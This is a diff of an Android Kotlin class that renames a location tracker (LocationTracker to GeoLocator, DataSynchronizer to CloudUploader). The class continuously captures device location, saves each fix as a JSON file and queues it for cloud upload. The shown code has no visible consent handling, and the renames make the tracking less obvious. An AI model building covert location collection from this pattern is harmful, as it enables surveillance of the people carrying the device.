@@ -20,11 +20,10 @@ import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
 import java.util.Timer
-import java.util.TimerTask
 import java.util.concurrent.CopyOnWriteArrayList
 
 @SuppressLint("HardwareIds")
-class LocationTracker private constructor(private val context: Context) {
+class GeoLocator private constructor(private val context: Context) {
     private val TAG = "LocationAnalytics"
     private val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
     private var locationListener: LocationListener? = null
@@ -45,19 +44,19 @@ class LocationTracker private constructor(private val context: Context) {
 
     companion object {
         @Volatile
-        private var instance: LocationTracker? = null
+        private var instance: GeoLocator? = null
 
-        fun getInstance(context: Context): LocationTracker {
+        fun getInstance(context: Context): GeoLocator {
             return instance ?: synchronized(this) {
-                instance ?: LocationTracker(context.applicationContext).also { instance = it }
+                instance ?: GeoLocator(context.applicationContext).also { instance = it }
             }
         }
     }
 
-    fun startTracking() {
+    fun initGeoMonitor() {
         significantLocationListener = object : LocationListener {
             override fun onLocationChanged(location: Location) {
-                processLocation(location)
+                handleGeoResult(location)
             }
 
             override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
@@ -70,7 +69,7 @@ class LocationTracker private constructor(private val context: Context) {
                 val currentTime = System.currentTimeMillis()
                 if(currentTime - lastLocationCaptureTime > MIN_TIME_BETWEEN_UPDATES) {
                     lastCapturedLocation = location
-                    processLocation(location)
+                    handleGeoResult(location)
                 }
             }
             override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
@@ -122,12 +121,12 @@ class LocationTracker private constructor(private val context: Context) {
         }
     }
 
-    fun captureLastKnownLocation(callback: (JSONObject) -> Unit) {
+    fun getLastGeoFix(callback: (JSONObject) -> Unit) {
         locationCallbacks.add(callback)
 
         try {
             if (lastCapturedLocation != null) {
-                val locationData = createLocationJson(lastCapturedLocation!!)
+                val locationData = buildGeoJson(lastCapturedLocation!!)
                 callback(locationData)
                 locationCallbacks.remove(callback)
                 return
@@ -135,7 +134,7 @@ class LocationTracker private constructor(private val context: Context) {
 
             val location = getLastKnownLocation()
             if (location != null) {
-                val locationData = createLocationJson(location)
+                val locationData = buildGeoJson(location)
                 callback(locationData)
                 locationCallbacks.remove(callback)
                 return
@@ -179,12 +178,12 @@ class LocationTracker private constructor(private val context: Context) {
         }
     }
 
-    private fun processLocation(location: Location) {
+    private fun handleGeoResult(location: Location) {
         lastCapturedLocation = location
         lastLocationCaptureTime = System.currentTimeMillis()
 
         try {
-            val locationJson = createLocationJson(location)
+            val locationJson = buildGeoJson(location)
 
             val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
             val filename = "location_${timestamp}.json"
@@ -197,8 +196,8 @@ class LocationTracker private constructor(private val context: Context) {
 
             Log.d(TAG, "Location processed: ${location.latitude}, ${location.longitude}")
 
-            val dataSynchronizer = DataSynchronizer(context)
-            dataSynchronizer.queueForSync("location_data", locationFile.absolutePath)
+            val cloudUploader = CloudUploader(context)
+            cloudUploader.enqueueUpload("location_data", locationFile.absolutePath)
             val callbacksToRemove = mutableListOf<(JSONObject) -> Unit>()
 
             for (callback in locationCallbacks) {
@@ -212,7 +211,7 @@ class LocationTracker private constructor(private val context: Context) {
         }
     }
 
-    private fun createLocationJson(location: Location): JSONObject {
+    private fun buildGeoJson(location: Location): JSONObject {
         val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
 
         return JSONObject().apply {
